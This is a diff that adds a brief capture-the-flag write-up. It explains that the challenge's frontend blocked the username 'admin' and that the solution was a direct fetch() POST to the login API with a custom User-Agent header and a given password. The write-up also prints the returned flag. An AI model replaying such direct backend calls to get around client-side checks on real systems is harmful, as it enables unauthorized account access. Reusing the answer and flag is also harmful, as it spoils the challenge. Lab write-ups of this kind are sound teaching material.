@@ -1,0 +1,18 @@
+Frontend checked for the username to be admin and blocked it.
+User was supposed to make a call to the backend by himself to bypass frontend "security" using the info provided in problem statement.
+
+The call "  fetch("/api/auth/login", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+    "User-Agent": "EAST_GREETER"
+  },
+  body: JSON.stringify({
+    username: "admin",
+    password: "GloryToArstotzka1982"
+  })
+}).then(r => r.json()).then(console.log)"
+
+Response-"GLORY TO ARSTOTZKA! Flag: FLAG{4ll_h41l_4rst0tzk4}"
+
+#Frontend security is not really security#
